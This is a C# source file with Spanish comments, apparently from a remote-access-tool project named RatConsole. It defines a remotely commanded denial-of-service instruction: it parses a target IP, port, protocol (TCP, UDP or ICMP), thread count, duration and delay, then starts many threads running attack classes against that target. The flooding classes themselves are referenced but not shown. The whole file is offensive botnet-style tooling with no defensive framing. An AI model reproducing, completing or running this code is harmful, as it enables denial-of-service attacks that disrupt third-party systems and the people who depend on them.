using System;
using System.Threading.Tasks;

using Bau.Libraries.LibCommonHelper.Extensors;
using Bau.Libraries.LibMarkupLanguage;
using RatConsole.Domain.Services.DoS;

namespace RatConsole.Domain
{
	/// <summary>
	///		Instrucción para un ataque DoS
	/// </summary>
	public class DoSAttackInstructionModel : BaseInstructionModel
	{
		// Constantes públicas
		public const string TagRoot = "DoS";
		private const string TagTargetType = "Target";
		private const string TagIp = "Ip";
		private const string TagPort = "Port";
		private const string TagThreads = "Threads";
		private const string TagMinutes = "Minutes";
		private const string TagDelay = "DelaySecondsBetweenAtacks";
		// Enumerados
		/// <summary>
		///		Tipo de objetivo
		/// </summary>
		public enum TargetType
		{
			/// <summary>Ataque por TCP</summary>
			Tcp,
			/// <summary>Ataque por UDP</summary>
			Udp,
			/// <summary>Ataque por ICMP</summary>
			Icmp
		}

		public DoSAttackInstructionModel(Controllers.ProgramManager manager) : base(manager) {}

		/// <summary>
		///		Interpreta el nodo
		/// </summary>
		public override BaseInstructionModel Parse(MLNode nodeML)
		{
			// Interpreta los datos básicos
			ParseInternal(nodeML);
			// Interpreta los datos de la instrucción
			Target = nodeML.Attributes[TagTargetType].Value.GetEnum(TargetType.Tcp);
			IP = nodeML.Attributes[TagIp].Value;
			Port = nodeML.Attributes[TagPort].Value.GetInt(0);
			Threads = nodeML.Attributes[TagThreads].Value.GetInt(1);
			Time = TimeSpan.FromMinutes(nodeML.Attributes[TagMinutes].Value.GetInt(1));
			DelayBetweenAtacks = TimeSpan.FromSeconds(nodeML.Attributes[TagDelay].Value.GetInt(3));
			// Devuelve la instrucción interpretada
			return this;
		}

		/// <summary>
		///		Ejecuta la instrucción
		/// </summary>
		protected override void ExecuteInternal()
		{
			// Log
			Manager.Log($"Ejecutando instrucción DoS. Url: {Target.ToString()}");
			// Ejecuta la instrucción
			if (Time.TotalSeconds > 0)
			{
				// Guardala fecha de inicio
				Start = DateTime.Now;
				// Crea los hilos
				for (int index = 0; index < Threads; index++)
					new Task(GetDoSAttack().Process).Start();
			}
			// Log
			Manager.Log($"Fin de ejecución de la instrucción DoS. Url: {Target.ToString()}");
		}

		/// <summary>
		///		Crea la clase adecuada para efectuar el ataque
		/// </summary>
		private AbstractDoSAttack GetDoSAttack()
		{
			switch (Target)
			{
				case TargetType.Udp:
					return new UdpDosAttack(IP, Port, DelayBetweenAtacks, DateTime.Now.Add(Time));
				case TargetType.Icmp:
					return new IcmpDosAttack(IP, Port, DelayBetweenAtacks, DateTime.Now.Add(Time));
				default:
					return new TcpDosAttack(IP, Port, DelayBetweenAtacks, DateTime.Now.Add(Time));
			}
		}

		/// <summary>
		///		Obtiene los datos del nodo
		/// </summary>
		public override MLNode GetMLNode()
		{
			MLNode nodeML = GetMLNodeInternal(TagRoot);

				// Añade los datos de la instrucción
				nodeML.Attributes.Add(TagTargetType, Target.ToString());
				nodeML.Attributes.Add(TagIp, IP);
				nodeML.Attributes.Add(TagPort, Port);
				nodeML.Attributes.Add(TagThreads, Threads);
				nodeML.Attributes.Add(TagMinutes, Time.TotalMinutes);
				nodeML.Attributes.Add(TagDelay, DelayBetweenAtacks.TotalSeconds);
				// Devuelve el nodo
				return nodeML;
		}

		/// <summary>
		///		Destino del ataque
		/// </summary>
		public TargetType Target { get; private set; }

		/// <summary>
		///		Dirección IP
		/// </summary>
		public string IP { get; private set; }

		/// <summary>
		///		Puerto
		/// </summary>
		public int Port { get; private set; }

		/// <summary>
		///		Número de hilos
		/// </summary>
		public int Threads { get; private set; }

		/// <summary>
		///		Tiempo del ataque
		/// </summary>
		public TimeSpan Time { get; private set; }

		/// <summary>
		///		Tiempo entre ataques
		/// </summary>
		public TimeSpan DelayBetweenAtacks { get; private set; }

		/// <summary>
		///		Hora de inicio del ataque
		/// </summary>
		private DateTime Start { get; set; }
	}
}